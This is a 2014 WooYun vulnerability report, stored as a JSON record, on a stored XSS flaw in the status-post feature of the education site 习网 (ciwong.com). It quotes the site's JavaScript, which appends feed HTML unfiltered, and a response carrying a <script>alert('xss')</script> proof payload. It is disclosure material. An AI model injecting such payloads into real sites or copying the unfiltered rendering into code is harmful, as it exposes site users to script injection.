{"id": 50616, "wybug_id": "wooyun-2014-077338", "wybug_title": "习网中发送说说存在储存型Xss", "wybug_corp": "习网", "wybug_author": "路人甲", "wybug_date": "2014-09-26 10:44", "wybug_open_date": "2014-11-10 10:46", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 习网发送说说本来是一个很好的平台,但是对于一些存在威胁的单词和字符没有进行过滤替换!存在一个储存型XSS 详细说明：  可能激活漏洞的地址:http://home.ciwong.com/http://i.ciwong.com/用户ID通过说说提交恶意代码, 代码将会储存在服务器. \n\n\n通过 GetTwitter(u, 0); 获取自己和别人发送的说说\n\nvar GetTwitter = function (u, t) {    var url = \"/twitter\";    if (t == null || t == undefined) {        t = 0;    }    $(\"#type_hd\").val(t);    if (u) url += \"/f/\" + u + \"/\" + t + \"/friendAndClassmember/15\";    $.getJSON(url + \"?t=\" + Math.random(), function (data) {        $(\"#tmain\").empty();        var ns = $(\".autonextscreen\");        if (data.hasNext)            ns.hide();        else            ns.show();        $.each(data.feeds, function (i, item) {            $(item).appendTo(\"#tmain\");//直接添加 没有过滤        });    });}\n返回json:\n{    \"result\": 0,    \"msg\": \"成功\",    \"hasNext\": true,    \"timestamp\": 635472740164847500,    \"uids\": [        98778,        369608646,        429916001,        98777    ],    \"show\": \"friendAndClassmember\",    \"btype\": 0,    \"feeds\": [        \"<li id=\\\"0\\\" rel=\\\"635472728195570502\\\" addid=\\\"98777\\\" class=\\\"cf tmsg\\\"><div class=\\\"user_pic\\\"><a href=\\\"http://i.ciwong.com/98777\\\" title=\\\"学生体验账号\\\"><img src=\\\"http://img1.ciwong.net/uidimg_default/98777/50\\\" /></a></div><div class=\\\"msg_box comment\\\" reid=\\\"0\\\"><div class=\\\"msg_cnt\\\"><em class=\\\"color2 userName\\\" rel=\\\"98777\\\"><a href=\\\"http://i.ciwong.com/98777\\\" title=\\\"学生体验账号\\\">学生体验账号</a>:</em><span class=\\\"msg\\\"><script>alert('xss')</script></span></div><div class=\\\"cf\\\"><span class=\\\"fl\\\">     <a href=\\\"#\\\" class=\\\"link_3 mr10\\\">19分钟前</a>     <a href=\\\"/t\\\" class=\\\"link_3\\\">通过微博</a></span><span class=\\\"fun_box\\\">     <a href=\\\"javascript:void(0);\\\" data-reid=\\\"20912193\\\" class=\\\"relay link_0\\\">转播</a>      <em class=\\\"color4\\\">|</em>     <a href=\\\"javascript:void(0);\\\" data-reid=\\\"20912193\\\" class=\\\"comt link_0\\\">评论</a></span></div></div></li>\"    ]}\n可以看出恶意代码并没有被过滤~~   漏洞证明：  \n\n\n\n   修复方案：  过滤 过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}